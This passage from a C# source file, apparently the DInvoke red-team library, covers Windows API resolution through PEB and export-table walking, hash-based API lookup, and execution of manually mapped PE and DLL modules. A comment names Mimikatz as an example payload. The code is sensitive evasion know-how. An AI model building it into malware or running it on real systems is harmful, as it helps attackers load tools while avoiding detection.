                        throw new FileNotFoundException(DLLName + ", unable to find the specified file.");
                    }
                }
                else if (hModule == IntPtr.Zero)
                {
                    throw new DllNotFoundException(DLLName + ", Dll was not found.");
                }

                return GetExportAddress(hModule, Ordinal, ResolveForwards: ResolveForwards);
            }

            /// <summary>
            /// Helper for getting the pointer to a function from a DLL loaded by the process.
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec)</author>
            /// <param name="DLLName">The name of the DLL (e.g. "ntdll.dll" or "C:\Windows\System32\ntdll.dll").</param>
            /// <param name="FunctionHash">Hash of the exported procedure.</param>
            /// <param name="Key">64-bit integer to initialize the keyed hash object (e.g. 0xabc or 0x1122334455667788).</param>
            /// <param name="CanLoadFromDisk">Optional, indicates if the function can try to load the DLL from disk if it is not found in the loaded module list.</param>
            /// <param name="ResolveForwards">Whether or not to resolve export forwards. Default is true.</param>
            /// <returns>IntPtr for the desired function.</returns>
            public static IntPtr GetLibraryAddress(string DLLName, string FunctionHash, long Key, bool CanLoadFromDisk = false, bool ResolveForwards = true)
            {
                IntPtr hModule = GetLoadedModuleAddress(DLLName);
                if (hModule == IntPtr.Zero && CanLoadFromDisk)
                {
                    hModule = LoadModuleFromDisk(DLLName);
                    if (hModule == IntPtr.Zero)
                    {
                        throw new FileNotFoundException(DLLName + ", unable to find the specified file.");
                    }
                }
                else if (hModule == IntPtr.Zero)
                {
                    throw new DllNotFoundException(DLLName + ", Dll was not found.");
                }

                return GetExportAddress(hModule, FunctionHash, Key, ResolveForwards: ResolveForwards);
            }

            /// <summary>
            /// Helper for getting the base address of a module loaded by the current process. This base
            /// address could be passed to GetProcAddress/LdrGetProcedureAddress or it could be used for
            /// manual export parsing. This function uses the .NET System.Diagnostics.Process class.
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec)</author>
            /// <param name="DLLName">The name of the DLL (e.g. "ntdll.dll").</param>
            /// <returns>IntPtr base address of the loaded module or IntPtr.Zero if the module is not found.</returns>
            public static IntPtr GetLoadedModuleAddress(string DLLName)
            {
                ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
                foreach (ProcessModule Mod in ProcModules)
                {
                    if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
                    {
                        return Mod.BaseAddress;
                    }
                }
                return IntPtr.Zero;
            }

            /// <summary>
            /// Helper for getting the base address of a module loaded by the current process. This base
            /// address could be passed to GetProcAddress/LdrGetProcedureAddress or it could be used for
            /// manual export parsing. This function parses the _PEB_LDR_DATA structure.
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec)</author>
            /// <param name="DLLName">The name of the DLL (e.g. "ntdll.dll").</param>
            /// <returns>IntPtr base address of the loaded module or IntPtr.Zero if the module is not found.</returns>
            public static IntPtr GetPebLdrModuleEntry(string DLLName)
            {
                // Get _PEB pointer
                Data.Native.PROCESS_BASIC_INFORMATION pbi = Native.NtQueryInformationProcessBasicInformation((IntPtr)(-1));

                // Set function variables
                UInt32 LdrDataOffset = 0;
                UInt32 InLoadOrderModuleListOffset = 0;
                if (IntPtr.Size == 4)
                {
                    LdrDataOffset = 0xc;
                    InLoadOrderModuleListOffset = 0xC;
                }
                else
                {
                    LdrDataOffset = 0x18;
                    InLoadOrderModuleListOffset = 0x10;
                }

                // Get module InLoadOrderModuleList -> _LIST_ENTRY
                IntPtr PEB_LDR_DATA = Marshal.ReadIntPtr((IntPtr)((UInt64)pbi.PebBaseAddress + LdrDataOffset));
                IntPtr pInLoadOrderModuleList = (IntPtr)((UInt64)PEB_LDR_DATA + InLoadOrderModuleListOffset);
                Data.Native.LIST_ENTRY le = (Data.Native.LIST_ENTRY)Marshal.PtrToStructure(pInLoadOrderModuleList, typeof(Data.Native.LIST_ENTRY));

                // Loop entries
                IntPtr flink = le.Flink;
                IntPtr hModule = IntPtr.Zero;
                Data.PE.LDR_DATA_TABLE_ENTRY dte = (Data.PE.LDR_DATA_TABLE_ENTRY)Marshal.PtrToStructure(flink, typeof(Data.PE.LDR_DATA_TABLE_ENTRY));
                while (dte.InLoadOrderLinks.Flink != le.Blink)
                {
                    // Match module name
                    if (Marshal.PtrToStringUni(dte.FullDllName.Buffer).EndsWith(DLLName, StringComparison.OrdinalIgnoreCase))
                    {
                        hModule = dte.DllBase;
                    }

                    // Move Ptr
                    flink = dte.InLoadOrderLinks.Flink;
                    dte = (Data.PE.LDR_DATA_TABLE_ENTRY)Marshal.PtrToStructure(flink, typeof(Data.PE.LDR_DATA_TABLE_ENTRY));
                }

                return hModule;
            }

            /// <summary>
            /// Generate an HMAC-MD5 hash of the supplied string using an Int64 as the key. This is useful for unique hash based API lookups.
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec)</author>
            /// <param name="APIName">API name to hash.</param>
            /// <param name="Key">64-bit integer to initialize the keyed hash object (e.g. 0xabc or 0x1122334455667788).</param>
            /// <returns>string, the computed MD5 hash value.</returns>
            public static string GetAPIHash(string APIName, long Key)
            {
                byte[] data = Encoding.UTF8.GetBytes(APIName.ToLower());
                byte[] kbytes = BitConverter.GetBytes(Key);

                using (HMACMD5 hmac = new HMACMD5(kbytes))
                {
                    byte[] bHash = hmac.ComputeHash(data);
                    return BitConverter.ToString(bHash).Replace("-", "");
                }
            }

            /// <summary>
            /// Given a module base address, resolve the address of a function by manually walking the module export table.
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec)</author>
            /// <param name="ModuleBase">A pointer to the base address where the module is loaded in the current process.</param>
            /// <param name="ExportName">The name of the export to search for (e.g. "NtAlertResumeThread").</param>
            /// <param name="ResolveForwards">Whether or not to resolve export forwards. Default is true.</param>
            /// <returns>IntPtr for the desired function.</returns>
            public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName, bool ResolveForwards = true)
            {
                IntPtr FunctionPtr = IntPtr.Zero;
                try
                {
                    // Traverse the PE header in memory
                    Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                    Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                    Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                    Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                    Int64 pExport = 0;
                    if (Magic == 0x010b)
                    {
                        pExport = OptHeader + 0x60;
                    }
                    else
                    {
                        pExport = OptHeader + 0x70;
                    }

                    // Read -> IMAGE_EXPORT_DIRECTORY
                    Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                    Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                    Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                    Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                    Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                    Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                    Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                    // Get the VAs of the name table's beginning and end.
                    Int64 NamesBegin = ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA));
                    Int64 NamesFinal = NamesBegin + NumberOfNames * 4;

                    // Loop the array of export name RVA's
                    for (int i = 0; i < NumberOfNames; i++)
                    {
                        string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));

                        if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                        {

                            Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                            Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                            FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);

                            if (ResolveForwards == true)
                                // If the export address points to a forward, get the address
                                FunctionPtr = GetForwardAddress(FunctionPtr);

                            break;
                        }
                    }
                }
                catch
                {
                    // Catch parser failure
                    throw new InvalidOperationException("Failed to parse module exports.");
                }

                if (FunctionPtr == IntPtr.Zero)
                {
                    // Export not found
                    throw new MissingMethodException(ExportName + ", export not found.");
                }
                return FunctionPtr;
            }

            /// <summary>
            /// Given a module base address, resolve the address of a function by manually walking the module export table.
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec)</author>
            /// <param name="ModuleBase">A pointer to the base address where the module is loaded in the current process.</param>
            /// <param name="Ordinal">The ordinal number to search for (e.g. 0x136 -> ntdll!NtCreateThreadEx).</param>
            /// <param name="ResolveForwards">Whether or not to resolve export forwards. Default is true.</param>
            /// <returns>IntPtr for the desired function.</returns>
            public static IntPtr GetExportAddress(IntPtr ModuleBase, short Ordinal, bool ResolveForwards = true)
            {
                IntPtr FunctionPtr = IntPtr.Zero;
                try
                {
                    // Traverse the PE header in memory
                    Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                    Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                    Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                    Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                    Int64 pExport = 0;
                    if (Magic == 0x010b)
                    {
                        pExport = OptHeader + 0x60;
                    }
                    else
                    {
                        pExport = OptHeader + 0x70;
                    }

                    // Read -> IMAGE_EXPORT_DIRECTORY
                    Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                    Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                    Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                    Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                    Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                    Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                    Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                    // Loop the array of export name RVA's
                    for (int i = 0; i < NumberOfNames; i++)
                    {
                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                        if (FunctionOrdinal == Ordinal)
                        {
                            Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                            FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);

                            if (ResolveForwards == true)
                                // If the export address points to a forward, get the address
                                FunctionPtr = GetForwardAddress(FunctionPtr);

                            break;
                        }
                    }
                }
                catch
                {
                    // Catch parser failure
                    throw new InvalidOperationException("Failed to parse module exports.");
                }

                if (FunctionPtr == IntPtr.Zero)
                {
                    // Export not found
                    throw new MissingMethodException(Ordinal + ", ordinal not found.");
                }
                return FunctionPtr;
            }

            /// <summary>
            /// Given a module base address, resolve the address of a function by manually walking the module export table.
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec)</author>
            /// <param name="ModuleBase">A pointer to the base address where the module is loaded in the current process.</param>
            /// <param name="FunctionHash">Hash of the exported procedure.</param>
            /// <param name="Key">64-bit integer to initialize the keyed hash object (e.g. 0xabc or 0x1122334455667788).</param>
            /// <param name="ResolveForwards">Whether or not to resolve export forwards. Default is true.</param>
            /// <returns>IntPtr for the desired function.</returns>
            public static IntPtr GetExportAddress(IntPtr ModuleBase, string FunctionHash, long Key, bool ResolveForwards = true)
            {
                IntPtr FunctionPtr = IntPtr.Zero;
                try
                {
                    // Traverse the PE header in memory
                    Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                    Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                    Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                    Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                    Int64 pExport = 0;
                    if (Magic == 0x010b)
                    {
                        pExport = OptHeader + 0x60;
                    }
                    else
                    {
                        pExport = OptHeader + 0x70;
                    }

                    // Read -> IMAGE_EXPORT_DIRECTORY
                    Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                    Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                    Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                    Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                    Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                    Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                    Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                    // Loop the array of export name RVA's
                    for (int i = 0; i < NumberOfNames; i++)
                    {
                        string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                        if (GetAPIHash(FunctionName, Key).Equals(FunctionHash, StringComparison.OrdinalIgnoreCase))
                        {
                            Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                            Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                            FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);

                            if (ResolveForwards == true)
                                // If the export address points to a forward, get the address
                                FunctionPtr = GetForwardAddress(FunctionPtr);

                            break;
                        }
                    }
                }
                catch
                {
                    // Catch parser failure
                    throw new InvalidOperationException("Failed to parse module exports.");
                }

                if (FunctionPtr == IntPtr.Zero)
                {
                    // Export not found
                    throw new MissingMethodException(FunctionHash + ", export hash not found.");
                }
                return FunctionPtr;
            }

            /// <summary>
            /// Check if an address to an exported function should be resolved to a forward. If so, return the address of the forward.
            /// </summary>
            /// <author>The Wover (@TheRealWover)</author>
            /// <param name="ExportAddress">Function of an exported address, found by parsing a PE file's export table.</param>
            /// <param name="CanLoadFromDisk">Optional, indicates if the function can try to load the DLL from disk if it is not found in the loaded module list.</param>
            /// <returns>IntPtr for the forward. If the function is not forwarded, return the original pointer.</returns>
            public static IntPtr GetForwardAddress(IntPtr ExportAddress, bool CanLoadFromDisk = false)
            {
                IntPtr FunctionPtr = ExportAddress;
                try
                {
                    // Assume it is a forward. If it is not, we will get an error
                    string ForwardNames = Marshal.PtrToStringAnsi(FunctionPtr);
                    string[] values = ForwardNames.Split('.');

                    if (values.Length > 1)
                    {
                        string ForwardModuleName = values[0];
                        string ForwardExportName = values[1];

                        // Check if it is an API Set mapping
                        Dictionary<string, string> ApiSet = GetApiSetMapping();
                        string LookupKey = ForwardModuleName.Substring(0, ForwardModuleName.Length - 2) + ".dll";
                        if (ApiSet.ContainsKey(LookupKey))
                            ForwardModuleName = ApiSet[LookupKey];
                        else
                            ForwardModuleName = ForwardModuleName + ".dll";

                        IntPtr hModule = GetPebLdrModuleEntry(ForwardModuleName);
                        if (hModule == IntPtr.Zero && CanLoadFromDisk == true)
                            hModule = LoadModuleFromDisk(ForwardModuleName);
                        if (hModule != IntPtr.Zero)
                        {
                            FunctionPtr = GetExportAddress(hModule, ForwardExportName);
                        }
                    }
                }
                catch
                {
                    // Do nothing, it was not a forward
                }
                return FunctionPtr;
            }

            /// <summary>
            /// Given a module base address, resolve the address of a function by calling LdrGetProcedureAddress.
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec)</author>
            /// <param name="ModuleBase">A pointer to the base address where the module is loaded in the current process.</param>
            /// <param name="ExportName">The name of the export to search for (e.g. "NtAlertResumeThread").</param>
            /// <returns>IntPtr for the desired function.</returns>
            public static IntPtr GetNativeExportAddress(IntPtr ModuleBase, string ExportName)
            {
                Data.Native.ANSI_STRING aFunc = new Data.Native.ANSI_STRING
                {
                    Length = (ushort)ExportName.Length,
                    MaximumLength = (ushort)(ExportName.Length + 2),
                    Buffer = Marshal.StringToCoTaskMemAnsi(ExportName)
                };

                IntPtr pAFunc = Marshal.AllocHGlobal(Marshal.SizeOf(aFunc));
                Marshal.StructureToPtr(aFunc, pAFunc, true);

                IntPtr pFuncAddr = IntPtr.Zero;
                Native.LdrGetProcedureAddress(ModuleBase, pAFunc, IntPtr.Zero, ref pFuncAddr);

                Marshal.FreeHGlobal(pAFunc);

                return pFuncAddr;
            }

            /// <summary>
            /// Given a module base address, resolve the address of a function by calling LdrGetProcedureAddress.
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec)</author>
            /// <param name="ModuleBase">A pointer to the base address where the module is loaded in the current process.</param>
            /// <param name="Ordinal">The ordinal number to search for (e.g. 0x136 -> ntdll!NtCreateThreadEx).</param>
            /// <returns>IntPtr for the desired function.</returns>
            public static IntPtr GetNativeExportAddress(IntPtr ModuleBase, short Ordinal)
            {
                IntPtr pFuncAddr = IntPtr.Zero;
                IntPtr pOrd = (IntPtr)Ordinal;

                Native.LdrGetProcedureAddress(ModuleBase, IntPtr.Zero, pOrd, ref pFuncAddr);

                return pFuncAddr;
            }

            /// <summary>
            /// Retrieve PE header information from the module base pointer.
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec)</author>
            /// <param name="pModule">Pointer to the module base.</param>
            /// <returns>PE.PE_META_DATA</returns>
            public static Data.PE.PE_META_DATA GetPeMetaData(IntPtr pModule)
            {
                Data.PE.PE_META_DATA PeMetaData = new Data.PE.PE_META_DATA();
                try
                {
                    UInt32 e_lfanew = (UInt32)Marshal.ReadInt32((IntPtr)((UInt64)pModule + 0x3c));
                    PeMetaData.Pe = (UInt32)Marshal.ReadInt32((IntPtr)((UInt64)pModule + e_lfanew));
                    // Validate PE signature
                    if (PeMetaData.Pe != 0x4550)
                    {
                        throw new InvalidOperationException("Invalid PE signature.");
                    }
                    PeMetaData.ImageFileHeader = (Data.PE.IMAGE_FILE_HEADER)Marshal.PtrToStructure((IntPtr)((UInt64)pModule + e_lfanew + 0x4), typeof(Data.PE.IMAGE_FILE_HEADER));
                    IntPtr OptHeader = (IntPtr)((UInt64)pModule + e_lfanew + 0x18);
                    UInt16 PEArch = (UInt16)Marshal.ReadInt16(OptHeader);
                    // Validate PE arch
                    if (PEArch == 0x010b) // Image is x32
                    {
                        PeMetaData.Is32Bit = true;
                        PeMetaData.OptHeader32 = (Data.PE.IMAGE_OPTIONAL_HEADER32)Marshal.PtrToStructure(OptHeader, typeof(Data.PE.IMAGE_OPTIONAL_HEADER32));
                    }
                    else if (PEArch == 0x020b) // Image is x64
                    {
                        PeMetaData.Is32Bit = false;
                        PeMetaData.OptHeader64 = (Data.PE.IMAGE_OPTIONAL_HEADER64)Marshal.PtrToStructure(OptHeader, typeof(Data.PE.IMAGE_OPTIONAL_HEADER64));
                    }
                    else
                    {
                        throw new InvalidOperationException("Invalid magic value (PE32/PE32+).");
                    }
                    // Read sections
                    Data.PE.IMAGE_SECTION_HEADER[] SectionArray = new Data.PE.IMAGE_SECTION_HEADER[PeMetaData.ImageFileHeader.NumberOfSections];
                    for (int i = 0; i < PeMetaData.ImageFileHeader.NumberOfSections; i++)
                    {
                        IntPtr SectionPtr = (IntPtr)((UInt64)OptHeader + PeMetaData.ImageFileHeader.SizeOfOptionalHeader + (UInt32)(i * 0x28));
                        SectionArray[i] = (Data.PE.IMAGE_SECTION_HEADER)Marshal.PtrToStructure(SectionPtr, typeof(Data.PE.IMAGE_SECTION_HEADER));
                    }
                    PeMetaData.Sections = SectionArray;
                }
                catch
                {
                    throw new InvalidOperationException("Invalid module base specified.");
                }
                return PeMetaData;
            }

            /// <summary>
            /// Resolve host DLL for API Set DLL.
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec), The Wover (@TheRealWover)</author>
            /// <returns>Dictionary, a combination of Key:APISetDLL and Val:HostDLL.</returns>
            public static Dictionary<string, string> GetApiSetMapping()
            {
                Data.Native.PROCESS_BASIC_INFORMATION pbi = Native.NtQueryInformationProcessBasicInformation((IntPtr)(-1));
                UInt32 ApiSetMapOffset = IntPtr.Size == 4 ? (UInt32)0x38 : 0x68;

                // Create mapping dictionary
                Dictionary<string, string> ApiSetDict = new Dictionary<string, string>();

                IntPtr pApiSetNamespace = Marshal.ReadIntPtr((IntPtr)((UInt64)pbi.PebBaseAddress + ApiSetMapOffset));
                Data.PE.ApiSetNamespace Namespace = (Data.PE.ApiSetNamespace)Marshal.PtrToStructure(pApiSetNamespace, typeof(Data.PE.ApiSetNamespace));
                for (var i = 0; i < Namespace.Count; i++)
                {
                    Data.PE.ApiSetNamespaceEntry SetEntry = new Data.PE.ApiSetNamespaceEntry();

                    IntPtr pSetEntry = (IntPtr)((UInt64)pApiSetNamespace + (UInt64)Namespace.EntryOffset + (UInt64)(i * Marshal.SizeOf(SetEntry)));
                    SetEntry = (Data.PE.ApiSetNamespaceEntry)Marshal.PtrToStructure(pSetEntry, typeof(Data.PE.ApiSetNamespaceEntry));

                    string ApiSetEntryName = Marshal.PtrToStringUni((IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetEntry.NameOffset), SetEntry.NameLength / 2);
                    string ApiSetEntryKey = ApiSetEntryName.Substring(0, ApiSetEntryName.Length - 2) + ".dll"; // Remove the patch number and add .dll

                    Data.PE.ApiSetValueEntry SetValue = new Data.PE.ApiSetValueEntry();

                    IntPtr pSetValue = IntPtr.Zero;

                    // If there is only one host, then use it
                    if (SetEntry.ValueLength == 1)
                        pSetValue = (IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetEntry.ValueOffset);
                    else if (SetEntry.ValueLength > 1)
                    {
                        // Loop through the hosts until we find one that is different from the key, if available
                        for (var j = 0; j < SetEntry.ValueLength; j++)
                        {
                            IntPtr host = (IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetEntry.ValueOffset + (UInt64)Marshal.SizeOf(SetValue) * (UInt64)j);
                            if (Marshal.PtrToStringUni(host) != ApiSetEntryName)
                                pSetValue = (IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetEntry.ValueOffset + (UInt64)Marshal.SizeOf(SetValue) * (UInt64)j);
                        }
                        // If there is not one different from the key, then just use the key and hope that works
                        if (pSetValue == IntPtr.Zero)
                            pSetValue = (IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetEntry.ValueOffset);
                    }

                    //Get the host DLL's name from the entry
                    SetValue = (Data.PE.ApiSetValueEntry)Marshal.PtrToStructure(pSetValue, typeof(Data.PE.ApiSetValueEntry));
                    string ApiSetValue = string.Empty;
                    if (SetValue.ValueCount != 0)
                    {
                        IntPtr pValue = (IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetValue.ValueOffset);
                        ApiSetValue = Marshal.PtrToStringUni(pValue, SetValue.ValueCount / 2);
                    }

                    // Add pair to dict
                    ApiSetDict.Add(ApiSetEntryKey, ApiSetValue);
                }

                // Return dict
                return ApiSetDict;
            }

            /// <summary>
            /// Call a manually mapped PE by its EntryPoint.
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec)</author>
            /// <param name="PEINFO">Module meta data struct (PE.PE_META_DATA).</param>
            /// <param name="ModuleMemoryBase">Base address of the module in memory.</param>
            /// <returns>void</returns>
            public static void CallMappedPEModule(Data.PE.PE_META_DATA PEINFO, IntPtr ModuleMemoryBase)
            {
                // Call module by EntryPoint (eg Mimikatz.exe)
                IntPtr hRemoteThread = IntPtr.Zero;
                IntPtr lpStartAddress = PEINFO.Is32Bit ? (IntPtr)((UInt64)ModuleMemoryBase + PEINFO.OptHeader32.AddressOfEntryPoint) :
                                                         (IntPtr)((UInt64)ModuleMemoryBase + PEINFO.OptHeader64.AddressOfEntryPoint);

                Native.NtCreateThreadEx(
                    ref hRemoteThread,
                    Data.Win32.WinNT.ACCESS_MASK.STANDARD_RIGHTS_ALL,
                    IntPtr.Zero, (IntPtr)(-1),
                    lpStartAddress, IntPtr.Zero,
                    false, 0, 0, 0, IntPtr.Zero
                );
            }

            /// <summary>
            /// Call a manually mapped DLL by DllMain -> DLL_PROCESS_ATTACH.
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec), TheWover (@TheRealWover)</author>
            /// <param name="PEINFO">Module meta data struct (PE.PE_META_DATA).</param>
            /// <param name="ModuleMemoryBase">Base address of the module in memory.</param>
            /// <returns>void</returns>
            public static void CallMappedDLLModule(Data.PE.PE_META_DATA PEINFO, IntPtr ModuleMemoryBase)
            {
                IntPtr lpEntryPoint = PEINFO.Is32Bit ? (IntPtr)((UInt64)ModuleMemoryBase + PEINFO.OptHeader32.AddressOfEntryPoint) :
                                                       (IntPtr)((UInt64)ModuleMemoryBase + PEINFO.OptHeader64.AddressOfEntryPoint);
                // If there is an entry point, call it
                if (lpEntryPoint != ModuleMemoryBase)
                {
                    Data.PE.DllMain fDllMain = (Data.PE.DllMain)Marshal.GetDelegateForFunctionPointer(lpEntryPoint, typeof(Data.PE.DllMain));
                    try
                    {
                        bool CallRes = fDllMain(ModuleMemoryBase, Data.PE.DLL_PROCESS_ATTACH, IntPtr.Zero);
                        if (!CallRes)
                        {
                            throw new InvalidOperationException("Call to entry point failed -> DLL_PROCESS_ATTACH");
                        }
                    }
                    catch
                    {
                        throw new InvalidOperationException("Invalid entry point -> DLL_PROCESS_ATTACH");
                    }
                }
            }

            /// <summary>
            /// Call a manually mapped DLL by Export.
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec)</author>
            /// <param name="PEINFO">Module meta data struct (PE.PE_META_DATA).</param>
            /// <param name="ModuleMemoryBase">Base address of the module in memory.</param>
            /// <param name="ExportName">The name of the export to search for (e.g. "NtAlertResumeThread").</param>
            /// <param name="FunctionDelegateType">Prototype for the function, represented as a Delegate object.</param>
            /// <param name="Parameters">Arbitrary set of parameters to pass to the function. Can be modified if function uses call by reference.</param>
            /// <param name="CallEntry">Specify whether to invoke the module's entry point.</param>
            /// <returns>void</returns>
            public static object CallMappedDLLModuleExport(Data.PE.PE_META_DATA PEINFO, IntPtr ModuleMemoryBase, string ExportName, Type FunctionDelegateType, object[] Parameters, bool CallEntry = true)
            {
                // Call entry point if user has specified
                if (CallEntry)
                {
                    CallMappedDLLModule(PEINFO, ModuleMemoryBase);
                }

                // Get export pointer
                IntPtr pFunc = GetExportAddress(ModuleMemoryBase, ExportName);

                // Call export
                return DynamicFunctionInvoke(pFunc, FunctionDelegateType, ref Parameters);
            }

            /// <summary>
            /// Call a manually mapped DLL by Export.
            /// </summary>
            /// <author>The Wover (@TheRealWover), Ruben Boonen (@FuzzySec)</author>
            /// <param name="PEINFO">Module meta data struct (PE.PE_META_DATA).</param>
            /// <param name="ModuleMemoryBase">Base address of the module in memory.</param>
            /// <param name="Ordinal">The number of the ordinal to search for (e.g. 0x07).</param>
            /// <param name="FunctionDelegateType">Prototype for the function, represented as a Delegate object.</param>
            /// <param name="Parameters">Arbitrary set of parameters to pass to the function. Can be modified if function uses call by reference.</param>
            /// <param name="CallEntry">Specify whether to invoke the module's entry point.</param>
            /// <returns>void</returns>
            public static object CallMappedDLLModuleExport(Data.PE.PE_META_DATA PEINFO, IntPtr ModuleMemoryBase, short Ordinal, Type FunctionDelegateType, object[] Parameters, bool CallEntry = true)
            {
                // Call entry point if user has specified
                if (CallEntry)
                {
                    CallMappedDLLModule(PEINFO, ModuleMemoryBase);
                }

                // Get export pointer
                IntPtr pFunc = GetExportAddress(ModuleMemoryBase, Ordinal);

                // Call export
                return DynamicFunctionInvoke(pFunc, FunctionDelegateType, ref Parameters);
            }

            /// <summary>
            /// Call a manually mapped DLL by Export.
            /// </summary>
            /// <author>The Wover (@TheRealWover), Ruben Boonen (@FuzzySec)</author>
            /// <param name="PEINFO">Module meta data struct (PE.PE_META_DATA).</param>
            /// <param name="ModuleMemoryBase">Base address of the module in memory.</param>
            /// <param name="FunctionHash">Hash of the exported procedure.</param>
            /// <param name="Key">64-bit integer to initialize the keyed hash object (e.g. 0xabc or 0x1122334455667788).</param>
            /// <param name="FunctionDelegateType">Prototype for the function, represented as a Delegate object.</param>
            /// <param name="Parameters">Arbitrary set of parameters to pass to the function. Can be modified if function uses call by reference.</param>
            /// <param name="CallEntry">Specify whether to invoke the module's entry point.</param>
            /// <returns>void</returns>
            public static object CallMappedDLLModuleExport(Data.PE.PE_META_DATA PEINFO, IntPtr ModuleMemoryBase, string FunctionHash, long Key, Type FunctionDelegateType, object[] Parameters, bool CallEntry = true)
            {
                // Call entry point if user has specified
                if (CallEntry)
                {
                    CallMappedDLLModule(PEINFO, ModuleMemoryBase);
                }

                // Get export pointer
                IntPtr pFunc = GetExportAddress(ModuleMemoryBase, FunctionHash, Key);

                // Call export
                return DynamicFunctionInvoke(pFunc, FunctionDelegateType, ref Parameters);
            }

            /// <summary>
